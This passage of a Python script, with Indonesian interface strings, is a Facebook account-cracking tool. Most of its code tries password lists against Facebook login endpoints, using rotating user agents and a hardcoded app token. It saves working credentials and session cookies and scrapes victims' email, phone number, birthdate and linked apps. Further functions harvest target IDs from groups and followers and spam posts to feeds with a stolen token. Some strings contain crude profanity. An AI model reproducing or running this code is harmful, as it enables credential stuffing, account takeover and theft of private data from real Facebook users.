					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text

					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]

					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text

					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text

					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text

					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text

					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]

					except:nomer = ""

					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')

					except:email=""

					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]

					except:ttl=""

					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]

					except:teman = ""

					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]

					except:pengikut = ""

					try:

						tahun = ""

						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))

						for nenen in cek_thn:

							tahun += nenen+", "

					except:pass



					infoakun += (f"[••] Nama Akun       : {nama}\n[••] Jumlah Teman    : {teman}\n[••] Jumlah Pengikut : {pengikut}\n[••] Email Aktif     : {email}\n[••] Nomor Aktif     : {nomer}\n[••] Tahun Akun      : {tahun}\n[••] Tanggal Lahir   : {ttl}\n")



					hit1, hit2 = 0,0

					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text

					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text

					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):

						infoakun += (f"Aplikasi Yang Terkait*\n")

						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:

							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")

						else:

							infoakun += (f"	Aplikasi Aktif : \n")

							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))

							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))

							for muncul in apkAktif:

								hit1+=1

								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")

								hit2+=1

						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:

							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")

						else:

							hit1,hit2=0,0

							infoakun += (f"	Aplikasi Kedaluwarsa :\n")

							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))

							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))

							for muncul in apkKadaluarsa:

								hit1+=1

								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")

								hit2+=1

					else:pass

					print('\n')

					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title='OK'))

					break





			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1



def crack2(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()

	ua = random.choice(ugen).replace('\n','')

	ses = requests.Session()

	for pw in pwv:

		try:

			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}

			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)

			if "www.facebook.com" in resp.json()["error_msg"]:

				if 'ya' in oprek:

					akun.append(idf+'|'+pw)

					ceker(idf,pw)

				else:

					print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))

					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

					akun.append(idf+'|'+pw)

					cp+=1

				break

			elif "session_key" in resp.text and "EAAA" in resp.text:

				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))

				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

				ok+=1

				break

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1



def crack3(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	print('\r%s >°< %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			tix = time.time()

			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text

			dataa ={

'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),

'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),

'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),

'li':re.search('name="li" value="(.*?)"', str(p)).group(1),

'email':idf,

'pass':pw

}

			ses.headers.update({'Host': 'mbasic.facebook.com',

'cache-control': 'max-age=0',

'upgrade-insecure-requests': '1',

'origin': 'https://mbasic.facebook.com',

'content-type': 'application/x-www-form-urlencoded',

'user-agent': ua,

'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',

'sec-fetch-site': 'same-origin',

'sec-fetch-mode': 'cors',

'sec-fetch-user': 'empty',

'sec-fetch-dest': 'document',

'referer': 'https://mbasic.facebook.com/login/?email='+idf,

'accept-encoding':'gzip, deflate br',

'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})



			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)

			if "checkpoint" in po.cookies.get_dict().keys():

				if 'ya' in oprek:

					akun.append(idf+'|'+pw)

					ceker(idf,pw)

				else:

					print('\n')

					statuscp = f'[•] ID : {idf} [•] PASSWORD : {pw}'

					statuscp1 = nel(statuscp, style='red')

					cetak(nel(statuscp1, title='SESI'))

					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

					akun.append(idf+'|'+pw)

					cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				if 'no'in taplikasi:

					ok+=1

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					print('\n')

					statusok = f'[OK]       : {idf}\n[OK] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'   

				elif 'ya'in taplikasi:

					ok+=1

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					user=idf

					infoakun = ""

					session = requests.Session()

					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text

					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text

					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text

					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text

					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text

				

					hit1, hit2 = 0,0

					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text

					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text

					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):

						infoakun += (f"Aplikasi Yang Terkait*\n")

						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:

							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")

						else:

							infoakun += (f"	—_Aplikasi Aktif : \n")

							infoakun += (f"	—_Aplikasi Kedaluwarsa : \n")

					else:pass

					print('\n')

					statusok = f'[CP]       : {idf}\n[CP] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'

					

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1



def ceker(idf,pw):

	global cp

	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'

	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	ses = requests.Session()

	try:

		hi = ses.get('https://mbasic.facebook.com')

		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')

		jo = ho.find('form')

		data = {}

		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

		for anj in jo('input'):

			if anj.get('name') in lion:

				data.update({anj.get('name'):anj.get('value')})

		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')

		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))

		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

		cp+=1

		opsi = kent.find_all('option')

		if len(opsi)==0:

			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))

		else:

			for opsii in opsi:

				print('\r%s---> %s%s'%(kk,opsii.text,x))

	except Exception as c:

		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))

		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))

		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

		cp+=1



def cek_opsi():

	c = len(akun)

	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)

	cetak(nel(hu, title='CEK OPSI'))

	input(x+'['+h+'•'+x+'] Mulai')

	cek = '# PROSES CEK OPSI DIMULAI'

	sol().print(mark(cek, style='green'))

	love = 0

	for kes in akun:

		try:

			try:

				id,pw = kes.split('|')[0],kes.split('|')[1]

			except IndexError:

				time.sleep(2)

				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))

				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))

				continue

			bi = random.choice([u,k,kk,b,h,hh])

			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()

			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'

			ses = requests.Session()

			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

			hi = ses.get('https://mbasic.facebook.com')

			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')

			if "checkpoint" in ses.cookies.get_dict().keys():

				try:

					jo = ho.find('form')

					data = {}

					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

					for anj in jo('input'):

						if anj.get('name') in lion:

							data.update({anj.get('name'):anj.get('value')})

					kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')

					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

					opsi = kent.find_all('option')

					if len(opsi)==0:

						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))

					else:

						for opsii in opsi:

							print('\r%s---> %s%s'%(kk,opsii.text,x))

				except:

					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))

			elif "c_user" in ses.cookies.get_dict().keys():

				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))

			else:

				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))

			love+=1

		except requests.exceptions.ConnectionError:

			print('')

			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'

			sol().print(mark(li, style='red'))

			exit()

	dah = '# DONE'

	sol().print(mark(dah, style='cyan'))

	exit()



def lah():

	print("\r"+balmond+m+" Total ID : "+str(len(id))+"                     ")

	input(balmond+m +" Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")

	pass

	setting()

	

def grup():

	win = '# PASTIKAN ID GROUP PUBLIK'

	win2 = mark(win, style='cyan')

	sol().print(win2)

	id = input(""+balmond+h+" Id Atau User Name Grup : ")

	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'

	miskinlu = {"user-agent": ua}

	url = "https://m.facebook.com/groups/"+id

	ses = requests.Session()

	try:

		gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")

	except requests.exceptions.ConnectionError:

		print(balmond+m+" Koneksi Internet Terputus..")

		time.sleep(0.5)

		exit()

	berr = gn.find("title")

	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")

	if berr2=='Masuk Facebook':

		print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")

		time.sleep(0.5)

		exit()

	elif berr2=='Kesalahan':

		jalan(balmond+m+" Grup Tidak Ditemukan..")

		time.sleep(0.5)

		exit()

	else:pass

	print(""+balmond+p+" Nama Grup : "+berr2)

	ggs = gn.find_all('table')

	ang = []

	for ff in ggs:

		anggo = ff.text

		bro = anggo.replace('Anggota','')

		try:

			mex = int(bro)

			jumlah = ang.append(mex)

		except:

			pass

	if len(ang)==0:

		print(balmond+h+" Anggota : -")

	else:

		print(balmond+h+" Anggota : "+str(ang[0]))

	grup1(url)



def grup1(urls):

	use = []

	ses = requests.Session()

	print(""+balmond+p+" Jika Stack, Mode Pesawat 5 Detik")

	print(balmond+p+" Sedang Mengumpulkan ID")

	print(balmond+p+" Tekan CTRL + C Untuk Stop")

	while True:

		try:

			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'

			miskinlu = {"user-agent": ua}

			try:

				url = use[0]

			except:

				url = urls

			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")

			bf2 = set.find_all('a')

			for g in bf2:

				css = str(g).split('>')

				if 'Lihat Postingan Lainnya</span' in css:

					bcj = str(g).replace('<a href="','').replace('amp;','')

					bcj2 = bcj.split(' ')[0].replace('"><img','')

			tes = set.find_all('table')

			for cari in tes:

				liatnih = cari.text

				spl = liatnih.split(' ')

				if 'mengajukan' in spl:

					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))

					idyou =	idsiapa[0].replace('content_owner_id_new.','')

					namayou = liatnih.replace(' mengajukan pertanyaan .','')

					idku = idyou+'|'+namayou

					if idku in id:

						continue

					else:

						id.append(idku)

						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()

				elif '>' in spl:

					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))

					idyou =	idsiapa[0].replace('content_owner_id_new.','')

					namayou = liatnih.split(' > ')[0]

					idku = idyou+'|'+namayou

					if idku in id:

						continue

					else:

						id.append(idku)

						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()

				else:

					continue

			try:

				link_ = bcj2

				use.insert(0,'https://m.facebook.com'+link_)

			except:

				girang = set.find('title')

				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")

				if girang2=='Masuk Facebook':

					pass

				else:

					lah()

		except requests.exceptions.ConnectionError:

			try:

				time.sleep(31)

			except KeyboardInterrupt:

				lah()

		except KeyboardInterrupt:

			lah()



saat_ini = datetime.datetime.now()



def run(link, token):



    while True:



        headers = {



            'authority': 'graph.facebook.com',



            'cache-control': 'max-age=0',



            'sec-ch-ua-mobile': '?0',



            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36',



        }



        try:



          response = requests.post(f'https://graph.facebook.com/me/feed?link={link}&published=0&access_token={token}', headers=headers)



          print(response.text)



        except:



          sys.login()



def main():



    banner()



    print('\x1b[0;94m┌───────────────────────────────────┐')

    #link = input('Link Posts : ')

    token = input('├──[•] Token Facebook :\x1b[0;92m ')



   # token = input('Token FB : ')

    link = input('\x1b[0;94m├──[•] Link Postingan :\x1b[0;92m ')

    print('\x1b[0;94m└───────────────────────────────────┘')



    number_thread = int(input('[✓]––>ISI AJA 20 BG  :\x1b[0;92m  '))



    for i in range(number_thread):

        thread = threading.Thread(target=run, args=(link, token))

#        print('SINGEK',thread.start())

        thread.start()

        

def follower():

    try:

        token = open('.token.txt', 'r').read()

    except IOError:

        exit()



    win = '# DUMP ID DARI FOLLOWER'

    win2 = mark(win, style='cyan')

    sol().print(win2)

    print(x + '[' + h + '•' + x + '] Ketik "me" Jika Ingin Dari Follower Mu')

    pili = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')

    try:

        koh2 = requests.get('https://graph.facebook.com/' + pili + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()

        for pi in koh2['subscribers']['data']:

            try:

                id.append(pi['id'] + '|' + pi['name'])

            except:

                continue



        print(x + '[' + h + '•' + x + '] Total : ' + str(len(id)))

        setting()

    except requests.exceptions.ConnectionError:

        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'

        lo = mark(li, style='red')

        sol().print(lo, style='cyan')

        exit()

    except (KeyError, IOError):

        teks = '# FOLLOWER TIDAK PUBLIK ATAU TOKEN RUSAK'

        teks2 = mark(teks, style='red')

        sol().print(teks2)

        exit()



def useragent():

	print ("\n%s[%s01%s]. Ganti user agent "%(P,H,P))

	print ("%s[%s02%s]. Cek user agent "%(P,H,P))

	print ("%s[%s00%s]. Kembali "%(P,H,P))

	__Aang__Sayang__Laura__ = input('\n%s[%s+%s] Pilih :%s '%(P,M,P,H))

	uas(__Aang__Sayang__Laura__)

	

def uas(__Aang__Sayang__Laura__):

	if __Aang__Sayang__Laura__ == '':

		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));sleep(2)

		uas(__Aang__Sayang__Laura__)

	elif __Aang__Sayang__Laura__ in("1","01"):

		print ("%s[%s!%s] Ketik %scancel%s untuk gunakan ua dari script"%(P,H,P,H,P))

		ua = input("%s[%s!%s] User agent :%s "%(P,H,P,H))

		if ua in(""):

			print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));sleep(2)

			menu()

		elif ua in("CANCEL","Cancel","cancel"):

			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")

			open("ua.txt","w").write(ua_);jeda(2)

			print ("\n%s[%s✓%s]  Berhasil menggunakan user agent script "%(P,H,P));jeda(2)

			pilihan().menu()

		open("ua.txt","w").write(ua);time.sleep(2)

		print ("\n%s[%s✓%s] Berhasil mengganti user agent"%(P,H,P));time.sleep(2)

		menu()

	elif __Aang__Sayang__Laura__ in("2","02"):

		try:

			ua_ = open('ua.txt', 'r').read();time.sleep(2)

			print ("%s[%s+%s] User anget lu :%s%s "%(P,H,P,H,ua_));time.sleep(2)

			input('\n%s[%s!%s] Tekan enter '%(P,H,P))

			menu()

		except IOError:

			ua_ = '%s-'%(M)

	elif __Aang__Sayang__Laura__ in("0","00"):

		menu()

	else:

		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));time.sleep(2)

		uas(__Aang__Sayang__Laura__)

		

if __name__=='__main__':

	try:os.mkdir('CP')

	except:pass

	try:os.mkdir('OK')

	except:pass

	login()
